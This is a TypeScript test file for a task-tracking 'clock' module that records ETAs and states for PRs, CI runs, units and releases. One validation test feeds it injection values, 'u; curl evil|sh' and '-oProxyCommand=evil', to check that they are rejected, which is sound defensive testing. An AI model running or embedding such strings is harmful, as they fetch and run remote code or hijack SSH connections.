// The clock (#1177, src/work/clock.ts): its record, its three verbs, and the state rules of the check.
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  addItem, checkAll, clockAt, doneItem, etaOf, lateOf, moveItem, nextEta, onClock, prState, readClock, releaseState, runClockTool,
  clockOn, unitState, type Probe,
} from "../src/work/clock.ts";

process.env.TZ = "America/New_York";   // the ETAs are said in Marco's hours; CI runs in UTC
process.env.SOL_CLOCK_ON = "on";       // the switch (#1274) is off by default; its own test below turns it
const fresh = () => { const f = join(mkdtempSync(join(process.env.TMPDIR ?? tmpdir(), "clock-")), "clock.json"); clockAt(f, "marcocyl04-ux"); return f; };
const T = (hhmm: string, base = Date.parse("2026-11-14T14:00:00-05:00")) => etaOf(hhmm, base)!;

test("an ETA is read as a person says it", () => {
  const now = Date.parse("2026-11-14T14:00:00-05:00");
  assert.equal(new Date(etaOf("16:45", now)!).getHours(), 16);
  assert.equal(etaOf("16:45", now)! - now, (2 * 60 + 45) * 60_000);
  assert.equal(etaOf("tomorrow 09:15", now)! - now, (19 * 60 + 15) * 60_000);
  assert.equal(etaOf("2026-11-14T15:00:00-05:00", now), Date.parse("2026-11-14T20:00:00Z"));
  assert.equal(etaOf(1794690000, now), 1794690000_000);
  assert.equal(etaOf("soon", now), null);
  assert.equal(etaOf("25:00", now), null);
});

test("a PR and its full CI give the state the sketch gave", () => {
  const pr = { state: "OPEN", branch: "b", url: "u" };
  assert.equal(prState({ ...pr, state: "MERGED" }, null).state, "done");
  assert.equal(prState({ ...pr, state: "CLOSED" }, null).state, "red");
  assert.equal(prState(pr, null).state, "building");
  assert.equal(prState(pr, { status: "in_progress", conclusion: "", id: 7 }).state, "ci");
  assert.equal(prState(pr, { status: "queued", conclusion: "", id: 7 }).state, "ci");
  assert.equal(prState(pr, { status: "completed", conclusion: "success", id: 7 }).state, "green");
  assert.equal(prState(pr, { status: "completed", conclusion: "failure", id: 7 }).state, "red");
  assert.equal(prState(pr, { status: "completed", conclusion: "cancelled", id: 7 }).state, "building");
  assert.equal(prState(null, null).detail, "the PR could not be read");
  assert.equal(prState(null, null, "green").state, "green");   // gh failed: the state stays
});

test("a unit unreachable keeps its state and says so; a release is done once a Sol runs it", () => {
  assert.deepEqual(unitState(null, "ci"), { state: "ci", detail: "unreachable" });
  assert.equal(unitState("active", "waiting").state, "building");
  assert.equal(unitState("failed", "building").state, "red");
  assert.equal(unitState("inactive", "building").state, "done");
  assert.equal(releaseState("dev-20261114-1235", ["dev-20261114-1234"]).state, "waiting");
  assert.equal(releaseState("dev-20261114-1235", ["dev-20261114-1234", "dev-20261114-1702"]).state, "done");
  assert.equal(releaseState("dev-20261114-1235", []).state, "waiting");
});

test("late is past its ETA and not done", () => {
  assert.equal(lateOf({ eta: 1, state: "ci" }, 2), true);
  assert.equal(lateOf({ eta: 1, state: "done" }, 2), false);
  assert.equal(lateOf({ eta: 3, state: "red" }, 2), false);
});

test("add, move (never silent) and done keep the record and tell", () => {
  const f = fresh(), now = Date.parse("2026-11-14T14:00:00-05:00");
  const told: number[] = []; const off = onClock((c) => told.push(c.items.length));
  const a = addItem({ title: "#1170 guard", kind: "pr", ref: "#1170", eta: "15:25", machine: "nucbox" }, "marcocyl04-ux", now);
  assert.equal(a.id, "1170-guard"); assert.equal(a.ref, "1170"); assert.equal(a.owner, "marcocyl04-ux"); assert.equal(a.state, "building");
  assert.throws(() => addItem({ title: "x", kind: "pr", ref: "abc", eta: "15:00" }, "m", now), /PR number/);
  assert.throws(() => addItem({ title: "x", kind: "yes", eta: "whenever" }, "m", now), /not a time/);
  assert.throws(() => addItem({ title: "x", kind: "unit", ref: "u; curl evil|sh", eta: "15:00" }, "m", now), /unit/);
  assert.throws(() => addItem({ title: "x", kind: "unit", ref: "sol-build-x", machine: "-oProxyCommand=evil", eta: "15:00" }, "m", now), /host name/);
  assert.throws(() => moveItem(a.id, "16:00", "  ", now), /says why/);
  const m = moveItem(a.id, "16:00", "CI rerun after the review fix", now);
  assert.equal(m.eta, T("16:00")); assert.equal(m.moves.length, 1); assert.equal(m.moves[0].from, T("15:25"));
  const d = doneItem(a.id, "merged by hand", now);
  assert.equal(d.state, "done"); assert.equal(d.detail, "merged by hand");
  const disk = JSON.parse(readFileSync(f, "utf8"));
  assert.equal(disk.items[0].state, "done"); assert.equal(disk.items[0].moves[0].why, "CI rerun after the review fix");
  assert.ok(told.length >= 3);
  off();
});

test("the tools answer in words and refuse in words", () => {
  fresh();
  assert.match(runClockTool("clock_add", { title: "the release", kind: "release", ref: "dev-20261114-1700", eta: "17:00" }), /^on the clock: the-release/);
  assert.equal(readClock().items[0].owner, "marcocyl04-ux");
  assert.throws(() => runClockTool("clock_move", { id: "the-release", eta: "17:30" }), /says why/);
  assert.match(runClockTool("clock_move", { id: "the-release", eta: "17:30", why: "CI slow" }), /because CI slow/);
  assert.match(runClockTool("clock_done", { id: "the-release" }), /^done/);
});

test("the check reads each kind, marks late, and never checks a done item again", async () => {
  fresh();
  const now = Date.parse("2026-11-14T15:30:00-05:00"), base = now - 3600_000;
  addItem({ id: "guard", title: "guard", kind: "pr", ref: "1170", eta: "15:25" }, "m", base);
  addItem({ id: "unit", title: "builder", kind: "unit", ref: "sol-build-d14-x", machine: "legion", eta: "16:00" }, "m", base);
  addItem({ id: "release", title: "release", kind: "release", ref: "dev-20261114-1235", eta: "17:00" }, "m", base);
  addItem({ id: "mine", title: "yes", kind: "yes", eta: "tomorrow 09:15" }, "m", base);
  addItem({ id: "old", title: "old", kind: "pr", ref: "1", eta: "15:00" }, "m", base);
  doneItem("old", "", base);
  let asked = 0;
  const p: Probe = {
    pr: async (n) => { asked++; return n === "1170" ? { state: "OPEN", branch: "g" } : null; },
    ci: async () => ({ status: "in_progress", conclusion: "", id: 42 }),
    unit: async () => null,
    tags: () => ["dev-20261114-1234"],
  };
  const c = await checkAll(p, now);
  const by = Object.fromEntries(c.items.map((i) => [i.id, i]));
  assert.equal(by.guard.state, "ci"); assert.equal(by.guard.late, true); assert.match(by.guard.detail, /run 42/);
  assert.equal(by.unit.detail, "unreachable"); assert.equal(by.unit.state, "building");
  assert.equal(by.release.state, "waiting");
  assert.equal(by.mine.state, "waiting"); assert.equal(by.mine.late, false);
  assert.equal(by.old.state, "done"); assert.equal(asked, 1);
  assert.equal(nextEta(c, now), by.unit.eta);
});

test("the switch: off by default, on with SOL_CLOCK_ON=on or a record already there, SOL_CLOCK_ON=off wins (#1274)", () => {
  const was = process.env.SOL_CLOCK_ON;
  try {
    const f = fresh();
    delete process.env.SOL_CLOCK_ON;
    assert.equal(clockOn(), false);
    assert.throws(() => runClockTool("clock_add", { title: "x", kind: "yes", eta: "16:00" }), /clock is off/);
    process.env.SOL_CLOCK_ON = "on";
    runClockTool("clock_add", { title: "x", kind: "yes", eta: "16:00" });
    delete process.env.SOL_CLOCK_ON;
    assert.equal(clockOn(), true, "a person who keeps a clock keeps it");
    assert.ok(readFileSync(f, "utf8"));
    process.env.SOL_CLOCK_ON = "off";
    assert.equal(clockOn(), false);
  } finally { if (was === undefined) delete process.env.SOL_CLOCK_ON; else process.env.SOL_CLOCK_ON = was; }
});

test("the clock's three tools are given only while it is on (#1274)", async () => {
  const { WORK_TOOLS, syncClockTools } = await import("../src/work/tools.ts");
  const names = () => WORK_TOOLS.map((t) => t.name as string).filter((n) => n.startsWith("clock_"));
  assert.deepEqual(names(), []);
  syncClockTools(true); assert.deepEqual(names().sort(), ["clock_add", "clock_done", "clock_move"]);
  syncClockTools(true); assert.equal(names().length, 3);
  syncClockTools(false); assert.deepEqual(names(), []);
});

test("nothing pending: the check asks nothing and writes nothing", async () => {
  fresh();
  let asked = 0;
  const p: Probe = { pr: async () => { asked++; return null; }, ci: async () => { asked++; return null; }, unit: async () => { asked++; return null; }, tags: () => { asked++; return []; } };
  await checkAll(p);
  addItem({ id: "a", title: "a", kind: "pr", ref: "1", eta: "16:00" }, "me");
  doneItem("a");
  let told = 0; const off = onClock(() => { told++; });
  await checkAll(p);
  off();
  assert.equal(asked, 0); assert.equal(told, 0);
});
